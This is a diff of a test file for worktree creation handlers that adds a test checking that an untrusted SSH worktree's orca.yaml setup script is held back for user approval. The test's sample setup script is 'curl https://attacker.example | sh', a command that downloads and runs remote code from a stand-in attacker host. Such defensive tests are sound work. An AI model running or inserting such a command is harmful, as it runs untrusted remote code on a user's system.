@@ -9,6 +9,8 @@ import {
   getActiveMultiplexerMock
 } from './worktrees-test-module-mocks'
 import { handlers, setupWorktreeHandlers, store } from './worktrees-test-harness'
+import { hashOrcaHookScriptContent } from '../../shared/orca-hook-trust'
+import { trustOrcaYamlSetup } from './worktrees-test-orca-hook-trust'
 
 vi.mock('electron', async () =>
   (await import('./worktrees-test-module-mocks')).electronModuleMock()
@@ -159,6 +161,7 @@ describe('registerWorktreeHandlers', () => {
     }
     store.getRepos.mockReturnValue([repo])
     store.getRepo.mockReturnValue(repo)
+    trustOrcaYamlSetup('repo-ssh', 'pnpm install')
     getSshGitProviderMock.mockReturnValue(provider)
     getSshFilesystemProviderMock.mockReturnValue(fsProvider)
     getActiveMultiplexerMock.mockReturnValue(mux)
@@ -202,6 +205,77 @@ describe('registerWorktreeHandlers', () => {
         }
       })
     )
+  })
+
+  it('withholds an untrusted SSH worktree orca.yaml setup and returns it for approval', async () => {
+    const repo = {
+      id: 'repo-ssh',
+      path: '/remote/repo',
+      displayName: 'ssh',
+      badgeColor: '#000',
+      addedAt: 0,
+      connectionId: 'conn-1',
+      worktreeBaseRef: 'origin/main'
+    }
+    const provider = {
+      exec: vi.fn().mockImplementation(async (args: string[]) => {
+        if (args[0] === 'remote') {
+          return { stdout: 'origin\n', stderr: '' }
+        }
+        if (args[0] === 'rev-parse' && args[1] === '--git-path') {
+          return { stdout: '/remote/repo/.git/worktrees/x/orca/setup-runner.sh\n', stderr: '' }
+        }
+        if (args[0] === 'rev-parse' || args[0] === 'show-ref') {
+          throw Object.assign(new Error('missing ref'), { code: 1 })
+        }
+        return { stdout: '', stderr: '' }
+      }),
+      fetchRemoteTrackingRef: vi.fn().mockResolvedValue(undefined),
+      addWorktree: vi.fn().mockResolvedValue(undefined),
+      listWorktrees: vi.fn().mockResolvedValue([
+        {
+          path: '/remote/repo-improve-dashboard',
+          head: 'abc123',
+          branch: 'refs/heads/improve-dashboard',
+          isBare: false,
+          isMainWorktree: false
+        }
+      ])
+    }
+    const fsProvider = {
+      readFile: vi.fn().mockResolvedValue({ content: 'unused', isBinary: false }),
+      createDir: vi.fn().mockResolvedValue(undefined),
+      writeFile: vi.fn().mockResolvedValue(undefined)
+    }
+    store.getRepos.mockReturnValue([repo])
+    store.getRepo.mockReturnValue(repo)
+    // The user approved the primary checkout's script, not the PR branch's.
+    trustOrcaYamlSetup('repo-ssh', 'pnpm install')
+    getSshGitProviderMock.mockReturnValue(provider)
+    getSshFilesystemProviderMock.mockReturnValue(fsProvider)
+    getActiveMultiplexerMock.mockReturnValue({ request: vi.fn(), notify: vi.fn() })
+    store.setWorktreeMeta.mockImplementation((_worktreeId, meta) => meta)
+    parseOrcaYamlMock.mockReturnValue({ scripts: { setup: 'curl https://attacker.example | sh' } })
+    getEffectiveHooksFromConfigMock.mockReturnValue({
+      scripts: { setup: 'curl https://attacker.example | sh' }
+    })
+    shouldRunSetupForCreateMock.mockReturnValue(true)
+
+    const result = (await handlers['worktrees:create'](null, {
+      repoId: 'repo-ssh',
+      name: 'improve-dashboard',
+      setupDecision: 'run'
+    })) as Record<string, unknown>
+
+    expect(result.setup).toBeUndefined()
+    expect(result.setupApproval).toEqual({
+      scriptContent: 'curl https://attacker.example | sh',
+      contentHash: hashOrcaHookScriptContent('curl https://attacker.example | sh'),
+      setup: expect.objectContaining({
+        runnerScriptPath: '/remote/repo/.git/worktrees/x/orca/setup-runner.sh'
+      }),
+      runDefaultTabCommands: false
+    })
   })
 
   it('keeps Windows SSH setup runners independent from the local Git Bash setting', async () => {
@@ -256,6 +330,7 @@ describe('registerWorktreeHandlers', () => {
     }
     store.getRepos.mockReturnValue([repo])
     store.getRepo.mockReturnValue(repo)
+    trustOrcaYamlSetup('repo-ssh', 'pnpm install')
     store.getSettings.mockReturnValue({
       branchPrefix: 'none',
       nestWorkspaces: false,
